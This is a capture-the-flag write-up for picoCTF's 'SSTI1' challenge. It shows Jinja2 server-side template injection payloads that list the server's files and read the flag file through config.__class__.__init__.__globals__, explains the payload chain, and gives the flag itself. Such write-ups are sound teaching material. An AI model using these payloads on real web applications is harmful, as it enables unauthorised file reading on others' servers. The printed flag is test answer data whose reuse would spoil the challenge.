# SSTI1

### Description:

I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.
`Click 'Launch Instance'.`
I heard templating is a cool and modular way to build web apps! Check out my website `here`!
Hint: Server Side Template Injection

### Commands / Steps:

```bash
# Step 1: Go to the website. We will see an input box where we can type in.

# Step 2: The hint says 'Server Side Template Injection'. So we will try injecting some python codes to get the flag. First, we will try to get the list of files on the server.
{{ config.__class__.__init__.__globals__['os'].listdir('.') }}
# Result: ['app.py', '__pycache__', 'flag', 'requirements.txt']

# Step 3: We will try to get the contents of the flag file since that file is the most likely to contain the flag.
{{ config.__class__.__init__.__globals__['__builtins__'].open('flag').read() }}
# Then, we will get the flag.
```

### Flag:

> picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}

### Notes / Tips

- SSTI Detection: Start with simple payloads like `{{ 7*7 }}` to confirm template injection
- Jinja2 Engine: This challenge uses Flask/Jinja2 templating (common in Python web apps)
- File Discovery: Use `os.listdir('.')` to explore the server's file system
- {{ config.__class__.__init__.__globals__['__builtins__'].open('flag').read() }}
        --> config.__class__                   # Gets the class object
        --> .__init__                          # Gets the constructor method  
        --> .__globals__                       # Gets the global namespace
        --> ['__builtins__']                   # Accesses built-in functions
        --> .open('flag')                      # Opens the flag file
        --> .read()                            # Reads the file content


